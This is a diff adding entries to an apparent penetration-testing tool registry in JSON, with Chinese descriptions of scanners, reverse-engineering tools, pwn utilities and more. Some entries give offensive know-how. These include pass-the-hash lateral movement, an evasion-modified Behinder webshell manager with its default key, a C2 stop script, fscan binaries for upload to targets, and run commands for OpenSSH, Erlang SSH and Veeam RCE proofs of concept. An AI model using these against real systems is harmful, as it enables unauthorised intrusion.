+    "description": "AWS渗透测试框架\n常用命令:\n  pacu                           进入交互控制台\n  # 常用模块:\n  run iam__enum_permissions      枚举IAM权限\n  run s3__enum                   枚举S3桶\n  run ec2__enum                  枚举EC2实例\n  run iam__privesc_scan          权限提升扫描",
+    "available": true
+  },
+  {
+    "id": "trivy",
+    "name": "Trivy",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/trivy",
+    "category": "cloud",
+    "env_id": null,
+    "args": "image nginx:latest",
+    "tags": [
+      "容器扫描",
+      "IaC",
+      "CVE"
+    ],
+    "description": "容器/IaC/代码漏洞扫描\n常用命令:\n  trivy image nginx:latest                   扫描Docker镜像\n  trivy fs /path/to/code                     扫描代码目录\n  trivy k8s --report=all cluster             扫描K8s集群\n  trivy config terraform/                    扫描Terraform IaC",
+    "available": true
+  },
+  {
+    "id": "tshark",
+    "name": "tshark",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/tshark",
+    "category": "traffic",
+    "env_id": null,
+    "args": "-i eth0",
+    "tags": [
+      "命令行抓包",
+      "流量分析",
+      "Wireshark"
+    ],
+    "description": "Wireshark命令行版本\n常用命令:\n  tshark -i eth0 -w capture.pcap\n  tshark -r capture.pcap -Y 'http.request'\n  tshark -r capture.pcap -T fields -e http.host -e http.request.uri\n  tshark -r capture.pcap -Y 'tcp.port==4444' -x",
+    "available": true
+  },
+  {
+    "id": "jadx-gui",
+    "name": "jadx-gui",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/jadx-gui",
+    "category": "android",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "APK反编译",
+      "Java",
+      "安卓"
+    ],
+    "description": "Android APK/DEX反编译GUI\n常用命令:\n  jadx-gui app.apk               打开GUI\n  jadx -d output/ app.apk        命令行反编译\n  jadx-gui                       拖入APK分析",
+    "available": true
+  },
+  {
+    "id": "apktool",
+    "name": "apktool",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/apktool",
+    "category": "android",
+    "env_id": null,
+    "args": "d app.apk",
+    "tags": [
+      "APK",
+      "逆向",
+      "smali"
+    ],
+    "description": "APK逆向工程工具\n常用命令:\n  apktool d app.apk              反编译(smali+资源)\n  apktool b app/ -o rebuilt.apk  重新打包\n  apktool d app.apk --no-debug-info",
+    "available": true
+  },
+  {
+    "id": "ghidra",
+    "name": "Ghidra",
+    "type": "gui",
+    "path": "/Applications/Ghidra.app",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "逆向",
+      "反汇编",
+      "NSA"
+    ],
+    "description": "Ghidra — NSA开源逆向工程框架\n\n路径: /Applications/Ghidra.app\n\n核心功能:\n- 多架构反汇编/反编译（x86/ARM/MIPS/RISC-V等）\n- 协作分析（Ghidra Server多人共享项目）\n- 脚本扩展（Java/Python）\n- 支持二进制diff、数据类型导入\n\n快速启动:\n```\nopen /Applications/Ghidra.app\n```\n下载/更新: https://ghidra-sre.org/",
+    "available": true
+  },
+  {
+    "id": "radare2",
+    "name": "radare2",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/radare2",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "逆向",
+      "反汇编",
+      "调试"
+    ],
+    "description": "命令行逆向框架\n常用命令:\n  r2 -d ./binary                 调试模式\n  r2 binary                      静态分析\n  # r2 内部:\n  aaa                            自动分析\n  afl                            列出函数\n  pdf @ main                     反汇编main\n  VV                             视觉模式",
+    "available": true
+  },
+  {
+    "id": "jd-gui",
+    "name": "JD-GUI",
+    "type": "gui",
+    "path": "/Applications/JD-GUI.app",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "Java反编译",
+      "JAR",
+      "CLASS"
+    ],
+    "description": "JD-GUI — Java Class/JAR反编译图形工具\n\n路径: /Applications/JD-GUI.app\n\n使用方式:\n```\nopen /Applications/JD-GUI.app\n# 拖拽 .jar/.class 文件到窗口即可反编译\n```\n输出: Java源码（可直接浏览/搜索/保存）\n\n常用场景: 分析Java Web应用逻辑、提取硬编码密钥、审计反序列化链\n\n下载: https://github.com/java-decompiler/jd-gui/releases",
+    "available": true
+  },
+  {
+    "id": "ropgadget",
+    "name": "ROPgadget",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/ROPgadget",
+    "category": "pwn",
+    "env_id": null,
+    "args": "--binary ./target",
+    "tags": [
+      "ROP",
+      "PWN",
+      "gadget"
+    ],
+    "description": "ROP gadget搜索\n常用命令:\n  ROPgadget --binary ./target --rop\n  ROPgadget --binary ./target --string '/bin/sh'\n  ROPgadget --binary ./target --rop | grep 'pop rdi'\n  ROPgadget --binary libc.so.6 --rop > gadgets.txt",
+    "available": true
+  },
+  {
+    "id": "one-gadget",
+    "name": "one_gadget",
+    "type": "shell",
+    "path": "~/.local/bin/one_gadget",
+    "category": "pwn",
+    "env_id": null,
+    "args": "/lib/x86_64-linux-gnu/libc.so.6",
+    "tags": [
+      "one_gadget",
+      "libc",
+      "shellcode"
+    ],
+    "description": "libc一键getshell gadget\n常用命令:\n  one_gadget /lib/x86_64-linux-gnu/libc.so.6\n  one_gadget libc.so.6 -l 2       更多备选gadget\n  one_gadget libc.so.6 -b 0x1234  指定基址",
+    "available": true
+  },
+  {
+    "id": "pwntools",
+    "name": "pwntools",
+    "type": "shell",
+    "path": "~/.local/bin/pwn",
+    "category": "pwn",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "PWN框架",
+      "CTF",
+      "exploit"
+    ],
+    "description": "PWN利用开发框架\n常用命令:\n  pwn checksec ./binary          检查保护\n  pwn cyclic 200                 生成cyclic模式串\n  pwn cyclic -l 0x6161616c       找offset\n  python3 -c 'from pwn import *; p=process(\"./bin\"); p.interactive()'",
+    "available": true
+  },
+  {
+    "id": "checksec",
+    "name": "checksec",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/checksec",
+    "category": "pwn",
+    "env_id": null,
+    "args": "--file=./binary",
+    "tags": [
+      "保护检测",
+      "ELF",
+      "NX/PIE/CANARY"
+    ],
+    "description": "ELF安全保护检测\n常用命令:\n  checksec --file=./binary\n  checksec --proc-all            检查所有运行进程\n  # 输出包括: RELRO, Stack Canary, NX, PIE, ASLR",
+    "available": true
+  },
+  {
+    "id": "semgrep",
+    "name": "semgrep",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/semgrep",
+    "category": "code-audit",
+    "env_id": null,
+    "args": "--config=auto .",
+    "tags": [
+      "SAST",
+      "代码审计",
+      "静态分析"
+    ],
+    "description": "静态应用安全测试(SAST)\n常用命令:\n  semgrep --config=auto .                     自动规则扫描当前目录\n  semgrep --config=p/java-security .          Java安全规则\n  semgrep --config=p/php-security .           PHP安全规则\n  semgrep --config=p/owasp-top-ten .          OWASP Top 10",
+    "available": true
+  },
+  {
+    "id": "jwt-tool",
+    "name": "jwt_tool",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/web/jwt_tool/jwt_tool.py",
+    "category": "web-bypass",
+    "env_id": "py-brew-3-12",
+    "args": "<JWT>",
+    "tags": [
+      "JWT",
+      "Web安全",
+      "Auth"
+    ],
+    "description": "JWT安全测试工具\n常用命令:\n  jwt_tool <token>               解码分析\n  jwt_tool <token> -T            篡改测试\n  jwt_tool <token> -C -d wordlist.txt  爆破secret\n  jwt_tool <token> -X a          alg:none攻击",
+    "available": true
+  },
+  {
+    "id": "wpprobe",
+    "name": "wpprobe",
+    "type": "shell",
+    "path": "~/.local/bin/wpprobe",
+    "category": "fingerprint",
+    "env_id": null,
+    "args": "-u https://example.com",
+    "tags": [
+      "WordPress",
+      "指纹",
+      "CMS"
+    ],
+    "description": "WordPress指纹识别\n常用命令:\n  wpprobe -u https://target.com\n  wpprobe -u https://target.com -a   枚举用户",
+    "available": true
+  },
+  {
+    "id": "hengxiang-gogogo",
+    "name": "横向工具 (GoGoGo)",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/post-ex/hengxiang/gogogo-jar-with-dependencies.jar",
+    "category": "lateral",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "lateral",
+      "pivot",
+      "intranet"
+    ],
+    "description": "GoGoGo — 内网横向移动综合工具\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/post-ex/hengxiang/gogogo-jar-with-dependencies.jar\n```\n功能:\n- SMB/RDP/SSH/WinRM批量横向\n- Pass-the-Hash / Pass-the-Ticket\n- 远程命令执行(WMIC/PSExec风格)\n- 凭据注入+横向批量执行",
+    "available": true
+  },
+  {
+    "id": "mitan-tool",
+    "name": "米坦工具",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/scan/mitan/mitan-jar-with-dependencies.jar",
+    "category": "vuln-scan",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "fingerprint",
+      "vuln",
+      "scan"
+    ],
+    "description": "米坦 Web安全综合扫描工具\n\n启动方式（需在工具目录下运行，依赖config.yaml）:\n```\ncd ~/TH_Tools/tools/scan/mitan\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar mitan-jar-with-dependencies.jar\n```\n功能: 资产指纹识别 + 漏洞扫描 + PoC验证\n内置 finger.json 指纹库 + config.yaml 扫描配置\n注意: 必须从mitan目录启动，否则报config.yaml FileNotFoundError",
+    "available": true
+  },
+  {
+    "id": "behinder-mode-custom",
+    "name": "冰蝎 自定义魔改",
+    "type": "java",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/webshell-managers/Behinder-Mode/Behinder-Mode.jar",
+    "category": "webshell",
+    "env_id": "java-java-8-mac-1-8-0-421",
+    "args": "",
+    "tags": [
+      "behinder",
+      "webshell",
+      "bypass"
+    ],
+    "description": "冰蝎 Behinder 定制魔改版 — 流量加密增强 + 免杀模板\n\n启动方式:\n```\n~/Workspace/security/tools/TH_Tools/Java_path/Java_8_Mac/Contents/Home/bin/java -jar ~/TH_Tools/tools/webshell-managers/Behinder-Mode/Behinder-Mode.jar\n```\n相比原版冰蝎增加:\n- 自定义流量加密方式（profiles目录可扩展）\n- JSP/PHP/ASPX多语言免杀落地模板\n- 内置数据库 data.db（历史连接记录）\n默认密钥: rebeyond",
+    "available": true
+  },
+  {
+    "id": "vshell-down",
+    "name": "vshell C2 停止",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/vshell-down.sh",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "vshell",
+      "c2",
+      "docker"
+    ],
+    "description": "vshell C2 停止脚本 — docker compose down\n\n执行:\n```\nbash ~/TH_Tools/tools/_launchers/vshell-down.sh\n```\n停止路径: ~/Workspace/security/tools/c2/vshell_4.9.3\n操作: docker compose down（停止并移除容器）\n配合 vshell C2 启动 脚本使用",
+    "available": true
+  },
+  {
+    "id": "fscan-static-bin",
+    "name": "fscan 静态包 (目标机上传用)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/fscan-static-finder.sh",
+    "category": "intranet-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "fscan",
+      "static",
+      "linux",
+      "upload"
+    ],
+    "description": "fscan Linux静态二进制 — 上传到目标机器内网扫描\n\n查看静态包位置:\n```\nbash ~/TH_Tools/tools/_launchers/fscan-static-finder.sh\n```\n文件路径: ~/Workspace/security/tools/static-bins/fscan/\n  fscan_linux_amd64  (x86_64)\n  fscan_linux_arm64  (ARM)\n\n上传到目标机后:\n```\nchmod +x fscan_linux_amd64\n./fscan_linux_amd64 -h 10.0.0.0/24\n./fscan_linux_amd64 -h 10.0.0.0/24 -o /tmp/r.txt --np --nobr\n```",
+    "available": true
+  },
+  {
+    "id": "cve-2024-6387-regresshion",
+    "name": "CVE-2024-6387 regreSSHion (OpenSSH RCE)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-6387-regresshion",
+    "category": "cve-exploit",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "openssh",
+      "rce",
+      "unauthenticated",
+      "linux"
+    ],
+    "description": "CVE-2024-6387 regreSSHion — OpenSSH Server 未授权RCE\n\n影响版本: OpenSSH < 4.4p1 或 8.5p1 ≤ ver < 9.8p1 (glibc Linux)\nCVSS: 8.1 | 远程未授权 → root\n漏洞原理: sshd signal handler竞争条件，登录超时触发SIGALRM异步调用不安全函数\n\n目录: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-6387-regresshion/\n\n检测（批量）:\n```\nnmap -p 22 --script ssh-auth-methods target\nssh -V target  # 查看OpenSSH版本\n```\n\n编译C PoC:\n```\ncd ~/poc/2024-2025-cve/CVE-2024-6387-regresshion\ngcc -o regresshion 7etsuo-regreSSHion.c -lpthread\n./regresshion <target_ip> 22\n```\n\n⚠️ 利用需要大量时间(竞争条件)，实战多用nuclei检测是否受影响:\n```\nnuclei -u target:22 -t network/cves/2024/CVE-2024-6387.yaml\n```",
+    "available": true
+  },
+  {
+    "id": "cve-2025-32433-erlang-ssh",
+    "name": "CVE-2025-32433 Erlang/OTP SSH RCE",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-32433-erlang-ssh/CVE-2025-32433.py",
+    "category": "cve-exploit",
+    "env_id": "py-brew-3-12",
+    "args": "",
+    "tags": [
+      "erlang",
+      "otp",
+      "ssh",
+      "rce",
+      "unauthenticated",
+      "cvss10"
+    ],
+    "description": "CVE-2025-32433 — Erlang/OTP SSH 未授权RCE (CVSS 10.0)\n\n影响版本: OTP-27.3.2以下, OTP-26.2.5.9以下, OTP-25.3.2.19以下\nCVSS: 10.0 | 无需认证，直接RCE\n漏洞原理: SSH协议处理中在认证前接受连接请求消息，允许未授权命令执行\n影响范围: 使用Erlang SSH库的系统（CouchDB, RabbitMQ, VerneMQ等）\n\n使用方法:\n```\ncd ~/poc/2024-2025-cve/CVE-2025-32433-erlang-ssh\npython3 CVE-2025-32433.py -t <target_ip> -p 22\n```\n\nDocker测试环境:\n```\ndocker build -t erlang-vuln .\ndocker run -p 2222:22 erlang-vuln\npython3 CVE-2025-32433.py -t 127.0.0.1 -p 2222\n```\n\n检测:\n```\nnmap -p 22 -sV target  # 看是否Erlang SSH\nnuclei -u target:22 -t network/cves/2025/CVE-2025-32433.yaml\n```",
+    "available": true
+  },
+  {
+    "id": "cve-2025-23120-veeam",
+    "name": "CVE-2025-23120 Veeam B&R RCE",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-23120-veeam",
+    "category": "cve-exploit",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "veeam",
+      "rce",
+      "deserialization",
+      "windows"
+    ],
+    "description": "CVE-2025-23120 — Veeam Backup & Replication RCE\n\n影响版本: Veeam B&R 12.0.x, 12.1.x (< 12.3.0.310)\nCVSS: 9.9 | 反序列化RCE，域加入机器的本地用户可利用\n漏洞原理: BinaryFormatter/XmlSerializer反序列化gadget链，通过RPC端口(9401)触发\n\n目录: ~/poc/2024-2025-cve/CVE-2025-23120-veeam/ (含README)\n\n检测:\n```\nnmap -p 9401,9395 target --open\n# Metasploit模块:\nuse auxiliary/scanner/veeam/veeam_backup_rce\n```\n\n公开EXP: https://github.com/sfewer-r7/CVE-2025-23120\n修复: 升级到 Veeam B&R 12.3.0.310+",
+    "available": true
+  }
+]
